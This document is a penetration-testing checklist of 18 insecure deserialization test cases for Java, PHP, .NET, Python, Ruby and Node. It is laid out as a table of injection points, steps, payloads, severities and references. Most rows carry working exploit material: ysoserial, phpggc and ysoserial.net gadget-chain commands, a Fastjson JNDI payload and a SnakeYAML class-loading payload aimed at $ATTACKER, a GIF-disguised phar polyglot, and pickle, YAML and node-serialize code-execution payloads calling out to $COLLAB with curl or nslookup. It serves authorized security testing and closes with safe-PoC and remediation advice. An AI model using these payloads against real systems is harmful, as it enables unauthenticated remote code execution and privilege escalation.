# Insecure Deserialization — Checklist

Expert per-attack **test-case matrix** for Insecure Deserialization — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*18 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| DESER-001 | Enumerate deserialization sinks | Recon &amp; Sinks | Cookies/session/auth tokens, .NET __VIEWSTATE, API bodies/hidden fields, remember-me/state tokens, file uploads, MQ/cache/RMI/JMX/T3/JNDI | 1. Hunt base64/binary blobs the app deserializes: cookies, session/auth tokens, hidden fields, 'remember me'/state.<br>2. Flag .NET __VIEWSTATE (+ __VIEWSTATEGENERATOR), API bodies/params, message-queue/cache payloads.<br>3. Treat file uploads as sinks: serialized objects, phar polyglots, pickle model files (.pkl/.pt/.joblib).<br>4. Grep source/JS for deserializer calls fed a base64 blob. | An inventory of every blob/endpoint that gets deserialized. | <code>Cookie: session=rO0AB... ; __VIEWSTATE=/wEP... ; body {"@type":...} ; upload model.pkl</code> | Missing the sink (esp. ViewState / phar upload) means missing unauth RCE. | Info | 0.0 (N/A) | Burp Suite Pro, Freddy, source grep | CWE-502; OWASP Testing Guide: Testing for Serialization (WSTG-INPV-11) |
| DESER-002 | Fingerprint the blob's format &amp; language | Recon &amp; Sinks | Each candidate blob | 1. Fingerprint: Java rO0/ACED, PHP O:/a:, .NET AAEAAAD/ViewState, Python \x80/!!python, Ruby \x04\x08/BAh, Node _$$ND_FUNC$$_, JSON @type/@class/$type.<br>2. Identify the library: ObjectInputStream/Jackson/Fastjson/BinaryFormatter/pickle/Marshal/SnakeYAML/node-serialize.<br>3. The format decides the entire exploit path. | The blob's language and (where possible) deserializer library are identified. | <code>python3 poc/deser_detect.py 'rO0ABXNy...' ; --cookie "$COOKIE"</code> | Correct fingerprint selects the right gadget tool; guessing wastes the engagement. | Info | 0.0 (N/A) | poc/deser_detect.py, Freddy | CWE-502; HackTricks: Deserialization |
| DESER-003 | Tamper test — confirm the sink | Confirm (safe) | Any identified blob | 1. Flip one byte/field of the blob and resend.<br>2. A deserialization error/stack trace naming ObjectInputStream/unserialize/BinaryFormatter/pickle confirms the sink + language.<br>3. This is safe - no code exec. | A tamper produces a deserialization error/stack trace tied to a known deserializer. | <code>flip one base64 byte -&gt; 500 'java.io.StreamCorruptedException' / 'unserialize(): Error at offset'</code> | Confirms an active deserialization sink before any risky payload. | Info | 0.0 (N/A) | Burp Repeater | CWE-502; PortSwigger Web Security Academy: Insecure deserialization |
| DESER-004 | Blind DNS gadget — confirm deserialization (Java URLDNS) | Confirm (safe) | Confirmed sink, before any RCE payload | 1. Java: ysoserial URLDNS 'http://UNIQUE.$COLLAB' &#124; base64 -w0 -&gt; drop into the cookie/param.<br>2. A DNS hit to $COLLAB confirms deserialization with NO gadget dependency and NO code exec.<br>3. Per-language equivalent callbacks for PHP/.NET/Python. | A DNS callback to your OOB host confirms the blob is deserialized (no RCE risk). | <code>java -jar ysoserial.jar URLDNS "http://UNIQUE.$COLLAB" &#124; base64 -w0</code> | The clean first proof: deserialization confirmed safely, ready to escalate. | High | 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L) | ysoserial, interactsh, Burp Collaborator | CWE-502; PortSwigger Web Security Academy: Insecure deserialization |
| DESER-005 | Java — ysoserial gadget chain (probe then fire) | Exploit — Java | Java ObjectInputStream sinks (rO0/ACED) | 1. GadgetProbe (Burp) to learn which gadget libraries are on the classpath - don't spray.<br>2. Fire the MATCHING chain with a benign command: ysoserial CommonsCollections5 'nslookup UNIQUE.$COLLAB' &#124; base64 -w0.<br>3. Chains: CommonsCollections1-7, Spring1/2, Groovy1, Hibernate1, ROME, C3P0, JRMPClient. | The matching ysoserial chain yields an OOB hit / benign command execution. | <code>java -jar ysoserial.jar CommonsCollections6 'nslookup UNIQUE.$COLLAB' &#124; base64 -w0</code> | Unauthenticated RCE via Java deserialization - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ysoserial, GadgetProbe, Freddy | CWE-502; PayloadsAllTheThings/Insecure Deserialization |
| DESER-006 | Java JSON/YAML libs -&gt; JNDI -&gt; RCE | Exploit — Java | Fastjson (@type), Jackson (default typing), SnakeYAML, XStream | 1. Stand up a JNDI/LDAP ref server: marshalsec.jndi.LDAPRefServer 'http://$ATTACKER/#Exploit'<br>1389. 2. Fastjson: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://$ATTACKER:1389/Exploit","autoCommit":true}.<br>3. SnakeYAML: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://$ATTACKER/"]]]]. | The library resolves your JNDI reference and loads/executes your class. | <code>{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://$ATTACKER:1389/Exploit","autoCommit":true}</code> | RCE via JSON/YAML type-handling + JNDI (Fastjson/Log4Shell family) - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | marshalsec, ysoserial | CWE-502; CWE-917; HackTricks: Deserialization |
| DESER-007 | PHP — PHPGGC framework POP chain | Exploit — PHP | PHP unserialize() sinks (O:/a:) | 1. phpggc -l to list framework chains (Laravel/Symfony/WordPress/Monolog/Guzzle/Yii).<br>2. Generate: phpggc Laravel/RCE1 system 'curl http://$COLLAB/p'.<br>3. Inject the serialized string into the sink; confirm via OOB. | The POP chain executes your benign command server-side. | <code>phpggc Monolog/RCE1 system 'nslookup UNIQUE.$COLLAB'</code> | RCE via PHP object injection - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | PHPGGC | CWE-502; PayloadsAllTheThings/Insecure Deserialization |
| DESER-008 | PHP — phar deserialization (no unserialize call) | Exploit — PHP | Any file op (file_exists/getimagesize/fopen) reachable with a phar:// path; file upload | 1. Build a phar polyglot disguised as an image: phpggc -p phar -pj 'GIF89a' -o evil.gif Monolog/RCE1 system id.<br>2. Upload it (passes GIF89a validators).<br>3. Trigger any file op on phar://evil.gif/x -&gt; metadata is deserialized -&gt; RCE. | A file operation on the phar:// path deserializes its metadata and executes code. | <code>phpggc -p phar --fast-destruct -pj 'GIF89a' -o evil.gif Monolog/RCE1 system 'curl http://$COLLAB/phar'</code> | RCE with NO unserialize() call in the code - a widely-missed sink. Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | PHPGGC, FileUpload kit | CWE-502; HackTricks: Deserialization |
| DESER-009 | PHP — object tampering / __wakeup count bypass (auth bypass) | Exploit — PHP | unserialize() with no gadget chain available | 1. Flip a security property: O:4:"User":2:{s:7:"isAdmin";b:0;} -&gt; b:1.<br>2. __wakeup bypass (CVE-2016-7124): declare a wrong property COUNT to skip __wakeup validation.<br>3. Confirm privilege/identity change. | A tampered object flips a privilege flag or bypasses __wakeup validation. | <code>O:4:"User":2:{s:4:"name";s:5:"guest";s:7:"isAdmin";b:1;}</code> | Auth bypass / privilege escalation with no gadget chain needed - High/Critical. | High | 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-502; CWE-915; PayloadsAllTheThings/Insecure Deserialization |
| DESER-010 | .NET — ysoserial.net (BinaryFormatter/LosFormatter) | Exploit — .NET | .NET BinaryFormatter/LosFormatter sinks (AAEAAAD/////) | 1. Generate: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'nslookup UNIQUE.$COLLAB' -o base64.<br>2. Gadgets: TypeConfuseDelegate, ObjectDataProvider, WindowsIdentity, DataSet, ActivitySurrogateSelector.<br>3. Inject into the sink; confirm OOB. | The .NET gadget executes your benign command. | <code>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c nslookup UNIQUE.$COLLAB" -o base64</code> | RCE via .NET deserialization - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ysoserial.net, Freddy | CWE-502; PayloadsAllTheThings/Insecure Deserialization |
| DESER-011 | .NET — ViewState RCE (no MAC / leaked machineKey) | Exploit — .NET | __VIEWSTATE hidden field | 1. No MAC (EnableViewStateMac=false): ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'cmd /c nslookup UNIQUE.$COLLAB' --path=/page.aspx --apppath=/ --generator=&lt;GEN&gt; --validationalg=SHA1.<br>2. With a leaked machineKey (via XXE/LFI of web.config): add --validationkey=&lt;HEX&gt; --validationalg=SHA1.<br>3. Unauthenticated ViewState RCE = the big one. | A crafted ViewState is deserialized and executes your command. | <code>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup UNIQUE.$COLLAB" --path="/page.aspx" --generator=&lt;GEN&gt;</code> | Unauthenticated RCE via ViewState - Critical; chains from XXE/LFI machineKey leak. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ysoserial.net (ViewState), Blacklist3r | CWE-502; HackTricks: Deserialization |
| DESER-012 | JSON default-typing RCE (Json.NET $type) | Exploit — .NET/Java JSON | Json.NET with TypeNameHandling != None; Jackson enableDefaultTyping | 1. Json.NET: {"$type":"System.Windows.Data.ObjectDataProvider,...","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process,..."...cmd /c nslookup UNIQUE.$COLLAB}}.<br>2. Confirm the process/OOB fires. | The JSON type directive instantiates a dangerous type and runs your command. | <code>{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start",...}</code> | RCE via unsafe JSON polymorphic typing - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ysoserial.net, Burp | CWE-502; HackTricks: Deserialization |
| DESER-013 | Python — pickle / PyYAML / jsonpickle | Exploit — Python | pickle.loads / yaml.load(unsafe) / jsonpickle sinks; uploaded model files (.pkl/.pt/.joblib/.h5) | 1. pickle __reduce__: (os.system, ('nslookup UNIQUE.$COLLAB',)) -&gt; base64.<br>2. PyYAML: !!python/object/apply:os.system ['id'].<br>3. ML model files deserialize via pickle on load - uploading/loading a model is a sink. | The pickle/YAML/model payload executes your benign command on load. | <code>!!python/object/apply:os.system ["nslookup UNIQUE.$COLLAB"]<br>python3 poc/pickle_poc.py --cmd 'curl http://$COLLAB/py'</code> | RCE via Python object/model deserialization - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/pickle_poc.py | CWE-502; HackTricks: Deserialization |
| DESER-014 | Ruby (Marshal/YAML) &amp; Node (node-serialize) | Exploit — Ruby/Node | Ruby Marshal.load/YAML.load (\x04\x08/BAh); Node node-serialize (_$$ND_FUNC$$_) | 1. Ruby: universal stdlib gadget generator -&gt; Marshal payload; YAML variant uses !ruby/object tags.<br>2. Node: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/n')}()"} -&gt; base64 into the sink.<br>3. Confirm via callback. | The Ruby/Node payload executes your benign command. | <code>{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup UNIQUE.$COLLAB')}()"}</code> | RCE via Ruby/Node deserialization - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | universal-gadget, Burp | CWE-502; PayloadsAllTheThings/Insecure Deserialization |
| DESER-015 | Gadget-less object tampering (auth bypass / privesc) | Escalate | Any language where no public chain exists | 1. No RCE chain? Flip identity/role fields in the object (isAdmin/role/user_id) for auth bypass / privesc.<br>2. Build a custom POP chain from source when no framework chain fits.<br>3. Confirm the privilege/identity change. | A tampered object grants elevated privilege or a different identity without RCE. | <code>flip role=user -&gt; role=admin / isAdmin true in the serialized object</code> | Auth bypass / privesc even when no RCE gadget is available - High/Critical. | High | 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-502; CWE-915; PortSwigger Web Security Academy: Insecure deserialization |
| DESER-016 | Cross-bug chains to deserialization RCE | Escalate — Chains | Confirmed secondary bug + a deserialization sink | 1. XXE/LFI -&gt; read web.config/machineKey -&gt; forge ViewState -&gt; RCE.<br>2. File upload -&gt; phar polyglot -&gt; file-op trigger -&gt; RCE.<br>3. SSRF -&gt; internal RMI/JMX/T3(WebLogic)/JNDI deserialization endpoint. | A secondary bug supplies the key/file/reach needed to complete deserialization RCE. | <code>XXE leaks machineKey -&gt; ViewState RCE ; upload phar -&gt; getimagesize() -&gt; RCE</code> | Turns a 'medium' info leak into unauth RCE - maximum client impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ysoserial.net, PHPGGC, SSRFmap | CWE-502; HackTricks: Deserialization |
| DESER-017 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: 'this base64 decodes to a serialized object' (no tamper/callback/RCE); a deserialization error on tamper with no exec/callback; a signed/MAC'd blob when you lack the key; URLDNS/DNS-only hit reported AS RCE (report as deser confirmation); a safe deserializer (allow-listed types / yaml.safe_load).<br>2. REQUIRE: real OOB / sleep / id proof.<br>3. Distinguish from Log4Shell/JNDI, XXE, prototype pollution, SSTI. | Only candidates with genuine callback/exec proof survive. | <code>decoded-a-blob = NOT a finding ; MAC'd blob w/o key = not exploitable ; DNS-only = confirmation not RCE</code> | Protects credibility; deserialization is dense with 'it's a serialized blob' false positives. | Info | 0.0 (N/A) | manual | CWE-502; PortSwigger Web Security Academy: Insecure deserialization |
| DESER-018 | Client-facing impact &amp; SAFE-PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with impact in business terms: unauth RCE / privesc.<br>2. Provide the fingerprint, the URLDNS confirmation, and ONE benign-command proof (id/OOB hit) - no shells.<br>3. Set CVSS 3.1 + CWE-502. Remediation: don't deserialize untrusted data; use data-only formats (JSON without type handling); if unavoidable, integrity-protect (HMAC), allow-list types, run with least privilege.<br>4. SAFE-PoC: OOB-first, one benign command, no persistence/lateral movement, delete uploaded artifacts, tear down JNDI/LDAP/OOB servers, no prod DoS. | A reproducible, correctly-rated, safe PoC with clear remediation. | <code>PoC: fingerprint + URLDNS confirm + one benign-command proof + CVSS + CWE-502 + remediation.</code> | Converts confirmation into a defensible Critical report at the correct severity. | Info | 0.0 (N/A) | CVSS calculator, DESERIALIZATION_REPORT_TEMPLATE.md | CWE-502; FIRST CVSS v3.1; OWASP Testing Guide: Testing for Serialization (WSTG-INPV-11)  &#124;  TOP REFERENCES: Moritz Bechler 'Java Unmarshaller Security' (marshalsec); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; HackTricks; Alvaro Munoz .NET research |
